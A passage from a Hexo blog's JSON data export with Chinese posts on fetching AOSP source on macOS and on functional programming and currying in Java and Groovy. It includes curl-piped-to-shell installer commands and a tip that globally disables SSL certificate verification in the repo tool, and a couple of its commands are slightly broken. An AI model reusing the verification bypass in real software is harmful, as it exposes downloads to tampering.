Q完全退出）一下终端，再打开就可以自动补全各种命令（当然也包括git）了。\n\n### 推荐安装oh-my-zsh\n\n目前macOS上的终端默认已经是zsh了，而不是bash。推荐安装扩展版本的oh-my-zsh，无论是修改主题还是Tab自动补全都非常方便。安装方法还是很简单，按官方文档（[https://github.com/ohmyzsh/ohmyzsh](https://github.com/ohmyzsh/ohmyzsh)）：\n\n```bash\nsh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n# 或者用wget\nsh -c \"$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n```\n","slug":"macOS下载AOSP的小坑","published":1,"updated":"2024-03-25T07:31:25.862Z","comments":1,"photos":[],"link":"","_id":"cluaufh12002tthe670w90f51","content":"<h2 id=\"爬坑\"><a href=\"#爬坑\" class=\"headerlink\" title=\"爬坑\"></a>爬坑</h2><p>以下载Android X源码为例，过程和下载AOSP是一样的，只是分支不同而已。源码在线地址：<a href=\"https://cs.android.com/androidx/platform/frameworks/support\">frameworks&#x2F;support</a></p>\n<h3 id=\"安装Homebrew\"><a href=\"#安装Homebrew\" class=\"headerlink\" title=\"安装Homebrew\"></a>安装Homebrew</h3><p>在Mac上搞开发必须的包管理工具，类似Ubuntu上的apt。安装非常简单，一行命令的事情，来自官网（<a href=\"https://brew.sh/index_zh-cn\">Homebrew</a>）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装repo工具\"><a href=\"#安装repo工具\" class=\"headerlink\" title=\"安装repo工具\"></a>安装repo工具</h3><p>可以直接下载谷歌官方的repo源码（<a href=\"https://gerrit.googlesource.com/git-repo\">https://gerrit.googlesource.com/git-repo</a>）然后自己配置命令，但这样很麻烦，直接用brew安装整套Android编译工具：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew cask install android-platform-tools</span><br></pre></td></tr></table></figure>\n\n<p>装完就可以直接使用repo命令了。</p>\n<h3 id=\"下载AOSP源码\"><a href=\"#下载AOSP源码\" class=\"headerlink\" title=\"下载AOSP源码\"></a>下载AOSP源码</h3><p>详细过程可参考：<a href=\"https://blog.ysy950803.top/2020/05/17/Win10%E7%94%A8WSL%E4%B8%8B%E8%BD%BDAOSP/\">Win10用WSL下载AOSP</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建一个源码目录，命名随意</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> AOSP</span><br><span class=\"line\"><span class=\"built_in\">cd</span> AOSP</span><br><span class=\"line\"><span class=\"comment\"># 这里以AndroidX分支示例</span></span><br><span class=\"line\">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b androidx-master-dev</span><br><span class=\"line\">repo <span class=\"built_in\">sync</span> -j4</span><br></pre></td></tr></table></figure>\n\n<p>然后报错了：</p>\n<blockquote>\n<p>fatal: error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1056)</p>\n</blockquote>\n<p>之前在Win10和Ubuntu甚至WSL都没有遇到这个坑。</p>\n<p><strong>解决办法：</strong></p>\n<p>打开repo工具的脚本，如果你是自己下载的git-repo源码那肯定知道在哪里，一般就是 <code>~/bin/repo</code> 。当然由于我们刚才是通过brew安装的，所以不在用户目录，直接文本编辑它：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo open -e /usr/local/bin/repo</span><br></pre></td></tr></table></figure>\n\n<p>在import sys那一行下面加入2行代码后如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> ssl</span><br><span class=\"line\"></span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br></pre></td></tr></table></figure>\n\n<p>保存后再去repo init就没问题了。这个主要原因是Python 2.7.9后在打开HTTPS链接时加入了SSL验证导致的，然鹅我们并不需要这些，所以上面的代码就是关闭这个。</p>\n<h2 id=\"私货\"><a href=\"#私货\" class=\"headerlink\" title=\"私货\"></a>私货</h2><h3 id=\"让终端默认支持git自动补全\"><a href=\"#让终端默认支持git自动补全\" class=\"headerlink\" title=\"让终端默认支持git自动补全\"></a>让终端默认支持git自动补全</h3><p>可参考（<a href=\"https://blog.csdn.net/tiancaijyy/article/details/84888868\">https://blog.csdn.net/tiancaijyy/article/details/84888868</a>）</p>\n<p>1、安装bash-completion</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install bash-completion</span><br><span class=\"line\"><span class=\"comment\"># 成功后查看一下信息</span></span><br><span class=\"line\">brew info bash-comletion</span><br></pre></td></tr></table></figure>\n\n<p>2、在info里可以看到一个 <code>Add the following line to your ~/.bash_profile:</code> 提示，让你把下面命令加到你的~&#x2F;.bash_profile文件中：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[[ -r <span class=\"string\">&quot;/usr/local/etc/profile.d/bash_completion.sh&quot;</span> ]] &amp;&amp; . <span class=\"string\">&quot;/usr/local/etc/profile.d/bash_completion.sh&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>3、然后请先确定自己的git版本：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git --version</span><br><span class=\"line\"><span class=\"comment\"># 比如我这里输出</span></span><br><span class=\"line\">git version 2.26.2</span><br></pre></td></tr></table></figure>\n\n<p>4、下载git自动完成脚本到bash-completion命令目录下，注意URL中的版本号替换：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://raw.githubusercontent.com/git/git/v2.26.2/contrib/completion/git-completion.bash &gt; /usr/local/opt/bash-completion/etc/bash_completion.d</span><br></pre></td></tr></table></figure>\n\n<p>5、然后使其生效：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew <span class=\"built_in\">unlink</span> bash-completion</span><br><span class=\"line\">brew <span class=\"built_in\">link</span> bash-completion</span><br></pre></td></tr></table></figure>\n\n<p>最后重启（要command + Q完全退出）一下终端，再打开就可以自动补全各种命令（当然也包括git）了。</p>\n<h3 id=\"推荐安装oh-my-zsh\"><a href=\"#推荐安装oh-my-zsh\" class=\"headerlink\" title=\"推荐安装oh-my-zsh\"></a>推荐安装oh-my-zsh</h3><p>目前macOS上的终端默认已经是zsh了，而不是bash。推荐安装扩展版本的oh-my-zsh，无论是修改主题还是Tab自动补全都非常方便。安装方法还是很简单，按官方文档（<a href=\"https://github.com/ohmyzsh/ohmyzsh\">https://github.com/ohmyzsh/ohmyzsh</a>）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sh -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 或者用wget</span></span><br><span class=\"line\">sh -c <span class=\"string\">&quot;<span class=\"subst\">$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n","site":{"data":{"widget":{"top":[{"class_name":"donate","id_name":"donate","name":"随缘支持","icon":"fas fa-heartbeat","html":"<p style=\"text-align:center;padding:0;margin:0;\"><a href=\"https://qr.alipay.com/fkx12362diu95oh2aweaac5\"><img src=\"https://blog.ysy950803.top/img/love-support.png\" width=\"200\" height=\"200\"/></a></p> <p style=\"text-align:center;padding:0;margin:0;\">移动端点击二维码亦可</p> <p style=\"text-align:center;padding:0;margin:0;\"><u><a href=\"https://paypal.me/yaoshengyu\">Paypal.me if you like</a></u></p>"}]}}},"cover":false,"excerpt":"","more":"<h2 id=\"爬坑\"><a href=\"#爬坑\" class=\"headerlink\" title=\"爬坑\"></a>爬坑</h2><p>以下载Android X源码为例，过程和下载AOSP是一样的，只是分支不同而已。源码在线地址：<a href=\"https://cs.android.com/androidx/platform/frameworks/support\">frameworks&#x2F;support</a></p>\n<h3 id=\"安装Homebrew\"><a href=\"#安装Homebrew\" class=\"headerlink\" title=\"安装Homebrew\"></a>安装Homebrew</h3><p>在Mac上搞开发必须的包管理工具，类似Ubuntu上的apt。安装非常简单，一行命令的事情，来自官网（<a href=\"https://brew.sh/index_zh-cn\">Homebrew</a>）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/bin/bash -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安装repo工具\"><a href=\"#安装repo工具\" class=\"headerlink\" title=\"安装repo工具\"></a>安装repo工具</h3><p>可以直接下载谷歌官方的repo源码（<a href=\"https://gerrit.googlesource.com/git-repo\">https://gerrit.googlesource.com/git-repo</a>）然后自己配置命令，但这样很麻烦，直接用brew安装整套Android编译工具：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew cask install android-platform-tools</span><br></pre></td></tr></table></figure>\n\n<p>装完就可以直接使用repo命令了。</p>\n<h3 id=\"下载AOSP源码\"><a href=\"#下载AOSP源码\" class=\"headerlink\" title=\"下载AOSP源码\"></a>下载AOSP源码</h3><p>详细过程可参考：<a href=\"https://blog.ysy950803.top/2020/05/17/Win10%E7%94%A8WSL%E4%B8%8B%E8%BD%BDAOSP/\">Win10用WSL下载AOSP</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建一个源码目录，命名随意</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> AOSP</span><br><span class=\"line\"><span class=\"built_in\">cd</span> AOSP</span><br><span class=\"line\"><span class=\"comment\"># 这里以AndroidX分支示例</span></span><br><span class=\"line\">repo init -u https://aosp.tuna.tsinghua.edu.cn/platform/manifest -b androidx-master-dev</span><br><span class=\"line\">repo <span class=\"built_in\">sync</span> -j4</span><br></pre></td></tr></table></figure>\n\n<p>然后报错了：</p>\n<blockquote>\n<p>fatal: error [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1056)</p>\n</blockquote>\n<p>之前在Win10和Ubuntu甚至WSL都没有遇到这个坑。</p>\n<p><strong>解决办法：</strong></p>\n<p>打开repo工具的脚本，如果你是自己下载的git-repo源码那肯定知道在哪里，一般就是 <code>~/bin/repo</code> 。当然由于我们刚才是通过brew安装的，所以不在用户目录，直接文本编辑它：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo open -e /usr/local/bin/repo</span><br></pre></td></tr></table></figure>\n\n<p>在import sys那一行下面加入2行代码后如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> ssl</span><br><span class=\"line\"></span><br><span class=\"line\">ssl._create_default_https_context = ssl._create_unverified_context</span><br></pre></td></tr></table></figure>\n\n<p>保存后再去repo init就没问题了。这个主要原因是Python 2.7.9后在打开HTTPS链接时加入了SSL验证导致的，然鹅我们并不需要这些，所以上面的代码就是关闭这个。</p>\n<h2 id=\"私货\"><a href=\"#私货\" class=\"headerlink\" title=\"私货\"></a>私货</h2><h3 id=\"让终端默认支持git自动补全\"><a href=\"#让终端默认支持git自动补全\" class=\"headerlink\" title=\"让终端默认支持git自动补全\"></a>让终端默认支持git自动补全</h3><p>可参考（<a href=\"https://blog.csdn.net/tiancaijyy/article/details/84888868\">https://blog.csdn.net/tiancaijyy/article/details/84888868</a>）</p>\n<p>1、安装bash-completion</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew install bash-completion</span><br><span class=\"line\"><span class=\"comment\"># 成功后查看一下信息</span></span><br><span class=\"line\">brew info bash-comletion</span><br></pre></td></tr></table></figure>\n\n<p>2、在info里可以看到一个 <code>Add the following line to your ~/.bash_profile:</code> 提示，让你把下面命令加到你的~&#x2F;.bash_profile文件中：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[[ -r <span class=\"string\">&quot;/usr/local/etc/profile.d/bash_completion.sh&quot;</span> ]] &amp;&amp; . <span class=\"string\">&quot;/usr/local/etc/profile.d/bash_completion.sh&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>3、然后请先确定自己的git版本：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git --version</span><br><span class=\"line\"><span class=\"comment\"># 比如我这里输出</span></span><br><span class=\"line\">git version 2.26.2</span><br></pre></td></tr></table></figure>\n\n<p>4、下载git自动完成脚本到bash-completion命令目录下，注意URL中的版本号替换：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl https://raw.githubusercontent.com/git/git/v2.26.2/contrib/completion/git-completion.bash &gt; /usr/local/opt/bash-completion/etc/bash_completion.d</span><br></pre></td></tr></table></figure>\n\n<p>5、然后使其生效：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">brew <span class=\"built_in\">unlink</span> bash-completion</span><br><span class=\"line\">brew <span class=\"built_in\">link</span> bash-completion</span><br></pre></td></tr></table></figure>\n\n<p>最后重启（要command + Q完全退出）一下终端，再打开就可以自动补全各种命令（当然也包括git）了。</p>\n<h3 id=\"推荐安装oh-my-zsh\"><a href=\"#推荐安装oh-my-zsh\" class=\"headerlink\" title=\"推荐安装oh-my-zsh\"></a>推荐安装oh-my-zsh</h3><p>目前macOS上的终端默认已经是zsh了，而不是bash。推荐安装扩展版本的oh-my-zsh，无论是修改主题还是Tab自动补全都非常方便。安装方法还是很简单，按官方文档（<a href=\"https://github.com/ohmyzsh/ohmyzsh\">https://github.com/ohmyzsh/ohmyzsh</a>）：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sh -c <span class=\"string\">&quot;<span class=\"subst\">$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br><span class=\"line\"><span class=\"comment\"># 或者用wget</span></span><br><span class=\"line\">sh -c <span class=\"string\">&quot;<span class=\"subst\">$(wget -O- https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)</span>&quot;</span></span><br></pre></td></tr></table></figure>\n"},{"layout":"post","title":"浅谈JVM语言之函数式编程","subtitle":"见微知著。","date":"2020-06-09T16:00:00.000Z","author":"YSY","header-img":"img/archive-bg.jpg","catalog":true,"_content":"\n## Java中的函数式编程\n\n### 闲聊\n\n函数式编程在上世纪五十年代就有了，只不过在工业界一直不温不火，最近十年才被广泛认知。其理论基础也并非为编程而设计，而是一种数学抽象（Lamda演算），其实初中就学过了，λ表达式。\n\n在JS（建议把JS作为函数式编程思想学习的入门语言，Java的实现略显臃肿，可能不太便于理解）当中，函数式编程算是应用比较多的了。各现代高级编程语言，都或多或少地支持了函数式编程。\n\n### 一些基本特点总结\n\n- 相比平常的指令式编程，函数式编程更在乎执行结果而非过程；\n- 函数是一等公民，可以像普通的数值、引用等变量一样赋值、作为参数传递、作为返回值；\n- 函数是纯函数，即函数不能产生副作用，如不能修改全局变量等，固定的输入就映射固定的输出。\n\n### 简单示意一下\n\n不代表任何语言，因为不同语言在实现方式上有差异，但核心思想不变：\n\n```c\n// 定义一个函数g，并赋值给f\nf = g(x, y) = x + y\n// 写一个方法，函数作为参数传递\nprintF(g) {\n    print(g(1, 2))\n}\n// 调用方法\nprintF(f) // 打印结果3\n// 作为返回值\ngetF() {\n    return f\n}\n```\n\n### Java函数式编程\n\n看了上面的示意，是不是能联想到Java的Runnable了？\n\n```java\nRunnable f = ()-> {\n    // do something\n}\nvoid testF(Runnable r, int i) {\n    print(i);\n    r.run();\n}\ntestF(f, 1);\n// 看这个是不是有点函数式编程的影子了，其实Runnable接口的设计在Java 8之前就有了，还是很有远见的，在此可以把f看成一个无参无返回值的函数，也算是低配版的函数式编程嘛~\n```\n\n所以我们在Java 8的编程环境下，经常看到IDE提示new Runnable……可以转化成lamda表达式。\n\n真正的函数式编程本来Java 7就会支持的，但是甲骨文跳票你懂的，于是functional programming在Java 8才正式推出。从 `java.util.function` 包即可管中窥豹。\n\nJava后端开发中早就用烂了，在Android开发中必须API大于等于24才能完全开启Java 8特性（最新：Studio 4.0推出的新版Gradle插件已经支持解糖，不再需要API限制：[Java 8+ API desugaring support (Android Gradle Plugin 4.0.0+)](https://developer.android.com/studio/write/java8-support#library-desugaring)）。\n\n### Groovy函数式编程\n\nGradle脚本是基于Groovy这门JVM动态语言的，用它来表示函数式编程的概念更加清晰：\n\n```groovy\ndef func1 = { msg1 ->\n    println \"Look func1 $msg1\"\n\n    def fun2 = { msg2 ->\n        println msg2\n        \"ret fun2\" // 在闭包中最后一行值将直接作为返回结果，加不加return都可\n    }\n    return fun2\n// 等效简化代码\n//    return { msg2 ->\n//        println msg2\n//        \"ret fun2\"\n//    }\n}\n\nprintln func1('真的')('NB')\n```\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2020061010454618.png)\n\n## 柯里化理论基础\n\n柯里化是函数式编程的重要特性，简单理解就是把多参函数转化为一个个单一参数的元函数，第一个元函数处理完一个参数后，返回新一个元函数来处理剩下的参数，依此递归，就像工厂的流水线一样工作，各司其职。\n\n我们平时用到的builder、链式调用，其实都有这种概念在里面。\n具体原理可以参考资料，还是蛮有意思的：\n\n- [借助Java 8实现柯里化](https://www.jianshu.com/p/c623b8b2aec8)\n- [JavaScript 柯里化，了解一下？](https://juejin.im/post/5af13664f265da0ba266efcf)\n\n**Java8柯里化示例：**\n\n```java\nimport java.util.function.Function;\nimport java.util.function.IntFunction;\nimport java.util.function.IntUnaryOperator;\n\npublic class Curry {\n    private static final Function<Integer, Function<Integer, Function<Integer, Integer>>> CURRYING_1 =\n            x -> y -> z -> (x + y) * z;\n    private static final IntFunction<IntFunction<IntUnaryOperator>> CURRYING_2 =\n            x -> y -> z -> (x + y) * z;\n    private static final TriFunction<Integer, Integer, Integer, Integer> CURRYING_3 =\n            (x, y, z) -> (x + y) * z;\n\n    public static void main(String[] args) {\n        System.out.println(CURRYING_1.apply(1).apply(2).apply(3));\n        System.out.println(CURRYING_2.apply(1).apply(2).applyAsInt(3));\n        System.out.println(CURRYING_3.apply(1, 2, 3));\n    }\n\n    @FunctionalInterface\n    public interface TriFunction<U, T, S, R> {\n        R apply(U u, T t, S s);\n    }\n}\n```\n\n## 低版本Java兼容实践\n\n由于目前大多Android项目的minSDK对应的API等级还是19或者23，且未升级至Studio 4.0，并不能直接使用Java 8的全部特性，因此只能在编码层面进行部分特性的兼容：\n\n```groovy\n// build.gradle\nandroid {\n    compileOptions {\n        sourceCompatibility JavaVersion.VERSION_1_8\n        targetCompatibility JavaVersion.VERSION_1_8\n    }\n}\n```\n\n不过，我们也可以自己复制 `java.util.function` 包中的代码来实现函数式编程（比如AndroidX的工具包中就单独实现了Consumer接口），具体可参考 `androidx.core.util.Consumer` 的相关引用。\n\n对函数式编程支持程度高低的一个重要特征是函数是否作为编程语言的一等公民出现，也就是编程语言是否有内置的结构来表示函数。作为面向对象的编程语言，Java 中使用接口来表示函数。\n\n```java\n// 比如Consumer就是一种只接受一个输入，而没有输出的特殊函数\npublic interface Consumer<T> {\n    void accept(T t);\n}\n\n// 为通知构建，创建一个PendingIntent\npublic static PendingIntent createActivityI(int type, Consumer<Intent> consumer) {\n    Context appCtx = MyApp.getContext(); // 获取App全局Context\n    Intent intent = new Intent();\n    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n    if (consumer != null) {\n        consumer.accept(intent);\n    }\n    return PendingIntent.getActivity(appCtx, type, intent, PendingIntent.FLAG_UPDATE_CURRENT);\n}\n// 外部调用\nPendingIntent clickI = createActivityI(INTENT_TYPE_TEST, intent -> {\n    intent.setData(xxx);\n    intent.putExtra(xxx);\n    // ...对intent对象各种操作，无需关心内部是如何初始化的（实例化），我们只是外部消费者（consumer）\n});\n```\n\n上面这段代码可能咋一看跟真正的函数式编程并没有什么卵关系，甚至一般的builder模式也能实现。\n\n但我们应该把 **intent -> { ... }** 看成一个λ函数表达式，intent是唯一参数且**不可变**，并且我们应当遵守纯函数的规范，即 **{ ... }** 函数实现内部只对 intent 进行修饰等操作，不应该去做其他无关的事情（比如修改外部变量，甚至是调起其他功能模块等）。\n\n在消费者 `consumer.accept()` 的瞬间，内外互不相知干了什么，天然地做到了业务逻辑隔离。\n\n## 参考\n\n- [函数式编程思想概论](https://www.ibm.com/developerworks/cn/java/j-understanding-functional-programming-1)\n- [柯里化-wiki](https://zh.wikipedia.org/wiki/柯里化)\n- [JavaScript 函数式编程](https://juejin.im/post/5b4ac0d0f265da0fa959a785)\n\n## 请勿滥用\n\n越抽象和高级的东西，内部消耗越大，乃自然之理。虽然函数式编程有很多优点，如可读性好，函数无副作用，参数不可变（理论上适合并行操作，不用考虑死锁，实际上性能不够，是不是挺矛盾的？）等。\n\n但相比指令式编程，大量使用函数式编程，会影响程序性能。不适合做IO密集型操作和一些高性能的UI操作。从Java函数式编程的实现来看，内部也涉及到比较多的函数递归嵌套，给栈区带来一定的压力。\n\n**合理使用：**\n\n平时工作中可以利用函数式编程的理念来简化业务代码，如上文示例，还是蛮好的。\n","source":"_posts/2020-06-10-浅谈JVM语言之函数式编程.md","raw":"---\nlayout:     post\ntitle:      浅谈JVM语言之函数式编程\nsubtitle:   见微知著。\ndate:       2020-06-10\nauthor:     YSY\nheader-img: img/archive-bg.jpg\ncatalog: true\ntags:\n    - Java\n    - Android\n    - 前端\n---\n\n## Java中的函数式编程\n\n### 闲聊\n\n函数式编程在上世纪五十年代就有了，只不过在工业界一直不温不火，最近十年才被广泛认知。其理论基础也并非为编程而设计，而是一种数学抽象（Lamda演算），其实初中就学过了，λ表达式。\n\n在JS（建议把JS作为函数式编程思想学习的入门语言，Java的实现略显臃肿，可能不太便于理解）当中，函数式编程算是应用比较多的了。各现代高级编程语言，都或多或少地支持了函数式编程。\n\n### 一些基本特点总结\n\n- 相比平常的指令式编程，函数式编程更在乎执行结果而非过程；\n- 函数是一等公民，可以像普通的数值、引用等变量一样赋值、作为参数传递、作为返回值；\n- 函数是纯函数，即函数不能产生副作用，如不能修改全局变量等，固定的输入就映射固定的输出。\n\n### 简单示意一下\n\n不代表任何语言，因为不同语言在实现方式上有差异，但核心思想不变：\n\n```c\n// 定义一个函数g，并赋值给f\nf = g(x, y) = x + y\n// 写一个方法，函数作为参数传递\nprintF(g) {\n    print(g(1, 2))\n}\n// 调用方法\nprintF(f) // 打印结果3\n// 作为返回值\ngetF() {\n    return f\n}\n```\n\n### Java函数式编程\n\n看了上面的示意，是不是能联想到Java的Runnable了？\n\n```java\nRunnable f = ()-> {\n    // do something\n}\nvoid testF(Runnable r, int i) {\n    print(i);\n    r.run();\n}\ntestF(f, 1);\n// 看这个是不是有点函数式编程的影子了，其实Runnable接口的设计在Java 8之前就有了，还是很有远见的，在此可以把f看成一个无参无返回值的函数，也算是低配版的函数式编程嘛~\n```\n\n所以我们在Java 8的编程环境下，经常看到IDE提示new Runnable……可以转化成lamda表达式。\n\n真正的函数式编程本来Java 7就会支持的，但是甲骨文跳票你懂的，于是functional programming在Java 8才正式推出。从 `java.util.function` 包即可管中窥豹。\n\nJava后端开发中早就用烂了，在Android开发中必须API大于等于24才能完全开启Java 8特性（最新：Studio 4.0推出的新版Gradle插件已经支持解糖，不再需要API限制：[Java 8+ API desugaring support (Android Gradle Plugin 4.0.0+)](https://developer.android.com/studio/write/java8-support#library-desugaring)）。\n\n### Groovy函数式编程\n\nGradle脚本是基于Groovy这门JVM动态语言的，用它来表示函数式编程的概念更加清晰：\n\n```groovy\ndef func1 = { msg1 ->\n    println \"Look func1 $msg1\"\n\n    def fun2 = { msg2 ->\n        println msg2\n        \"ret fun2\" // 在闭包中最后一行值将直接作为返回结果，加不加return都可\n    }\n    return fun2\n// 等效简化代码\n//    return { msg2 ->\n//        println msg2\n//        \"ret fun2\"\n//    }\n}\n\nprintln func1('真的')('NB')\n```\n\n![在这里插入图片描述](https://imgconvert.csdnimg.cn/2020061010454618.png)\n\n## 柯里化理论基础\n\n柯里化是函数式编程的重要特性，简单理解就是把多参函数转化为一个个单一参数的元函数，第一个元函数处理完一个参数后，返回新一个元函数来处理剩下的参数，依此递归，就像工厂的流水线一样工作，各司其职。\n\n我们平时用到的builder、链式调用，其实都有这种概念在里面。\n具体原理可以参考资料，还是蛮有意思的：\n\n- [借助Java 8实现柯里化](https://www.jianshu.com/p/c623b8b2aec8)\n- [JavaScript 柯里化，了解一下？](https://juejin.im/post/5af13664f265da0ba266efcf)\n\n**Java8柯里化示例：**\n\n```java\nimport java.util.function.Function;\nimport java.util.function.IntFunction;\nimport java.util.function.IntUnaryOperator;\n\npublic class Curry {\n    private static final Function<Integer, Function<Integer, Function<Integer, Integer>>> CURRYING_1 =\n            x -> y -> z -> (x + y) * z;\n    private static final IntFunction<IntFunction<IntUnaryOperator>> CURRYING_2 =\n            x -> y -> z -> (x + y) * z;\n    private static final TriFunction<Integer, Integer, Integer, Integer> CURRYING_3 =\n            (x, y, z) -> (x + y) * z;\n\n    public static void main(String[] args) {\n        System.out.println(CURRYING_1.apply(1).apply(2).apply(3));\n        System.out.println(CURRYING_2.apply(1).apply(2).applyAsInt(3));\n        System.out.println(CURRYING_3.apply(1, 2, 3));\n    }\n\n    @FunctionalInterface\n    public interface TriFunction<U, T, S, R> {\n        R apply(U u, T t, S s);\n    }\n}\n```\n\n## 低版本Java兼容实践\n\n由于目前大多Android项目的minSDK对应的API等级还是19或者23，且未升级至Studio 4.0，并不能直接使用Java 8的全部特性，因此只能在编码层面进行部分特性的兼容：\n\n```groovy\n// build.gradle\nandroid {\n    compileOptions {\n        sourceCompatibility JavaVersion.VERSION_1_8\n        targetCompatibility JavaVersion.VERSION_1_8\n    }\n}\n```\n\n不过，我们也可以自己复制 `java.util.function` 包中的代码来实现函数式编程（比如AndroidX的工具包中就单独实现了Consumer接口），具体可参考 `androidx.core.util.Consumer` 的相关引用。\n\n对函数式编程支持程度高低的一个重要特征是函数是否作为编程语言的一等公民出现，也就是编程语言是否有内置的结构来表示函数。作为面向对象的编程语言，Java 中使用接口来表示函数。\n\n```java\n// 比如Consumer就是一种只接受一个输入，而没有输出的特殊函数\npublic interface Consumer<T> {\n    void accept(T t);\n}\n\n// 为通知构建，创建一个PendingIntent\npublic static PendingIntent createActivityI(int type, Consumer<Intent> consumer) {\n    Context appCtx = MyApp.getContext(); // 获取App全局Context\n    Intent intent = new Intent();\n    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);\n    if (consumer != null) {\n        consumer.accept(intent);\n    }\n    return PendingIntent.getActivity(appCtx, type, intent, 